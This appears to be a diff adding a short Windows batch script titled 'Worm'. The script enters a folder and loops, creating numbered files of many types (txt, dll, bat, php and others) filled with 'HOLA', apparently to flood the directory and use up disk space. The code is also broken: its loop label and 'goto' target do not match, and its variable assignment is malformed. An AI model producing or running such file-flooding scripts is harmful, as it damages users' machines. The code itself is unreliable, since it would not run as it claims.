@@ -1,0 +1,24 @@
+@echo off 
+title Worm 
+cd prueba 
+set worm = 1 
+:menú 
+Cls 
+set /a worm = %worm% + 1 
+echo HOLA>>%worm%.txt 
+echo HOLA>>%worm%.jpg 
+echo HOLA>>%worm%.gif 
+echo HOLA>>%worm%.png 
+echo HOLA>>%worm%.avi 
+echo HOLA>>%worm%.rar 
+echo HOLA>>%worm%.bmp 
+echo HOLA>>%worm%.flv 
+echo HOLA>>%worm%.dll 
+echo HOLA>>%worm%.pdf 
+echo HOLA>>%worm%.doc 
+echo HOLA>>%worm%.bat 
+echo HOLA>>%worm%.htm 
+echo HOLA>>%worm%.php 
+echo HOLA>>%worm%.css
+
+goto menu
